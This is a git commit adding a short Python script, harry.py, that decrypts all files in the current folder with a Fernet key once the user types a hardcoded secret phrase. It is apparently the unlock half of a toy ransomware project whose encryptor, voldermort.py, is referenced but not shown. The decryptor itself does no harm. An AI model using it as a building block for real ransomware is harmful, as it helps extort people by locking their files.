c203f31ac9678450a4c4528c59f030e857e1139b
Ashutosh K <81259418+KarAshutosh@users.noreply.github.com>
2022-10-15 13:28:56 +0000

    Add files via upload

---
+++ harry.py
@@ -0,0 +1,39 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+#finding files
+
+files = []
+
+for file in os.listdir():
+	if file == "voldermort.py" or file == "thekey.key" or file == "harry.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files)
+
+#decrypt files
+
+with open("thekey.key", "rb") as key:
+	secretkey = key.read()
+
+secretphrase = "coffee"
+
+user_phrase = input("Enter the secret phrase to decrypt your files\n")
+
+if user_phrase == secretphrase:
+	for file in files:
+		with open(file, "rb") as thefile:
+			contents = thefile.read()
+		contents_decrypted = Fernet(secretkey).decrypt(contents)
+		with open(file, "wb") as thefile:
+			thefile.write(contents_decrypted)
+	print("Files decrypted")
+else:
+	print("Wrong secret phrase")
+
+
+
